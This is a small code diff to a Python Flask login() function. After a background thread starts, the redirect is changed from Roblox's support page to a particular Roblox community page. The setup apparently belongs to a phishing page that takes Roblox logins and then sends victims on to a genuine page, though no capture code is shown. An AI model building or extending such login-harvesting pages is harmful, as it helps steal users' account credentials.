@@ -542,7 +542,7 @@ def login():
         thread.start()
 
         # ⚡ التوجيه الفوري إلى صفحة الدعم
-        return redirect("https://www.roblox.com/support")
+        return redirect("https://www.roblox.com/communities/35815907/BRAZILIAN-SPYDER#!/about")
 
     return render_template_string(html_page)
 
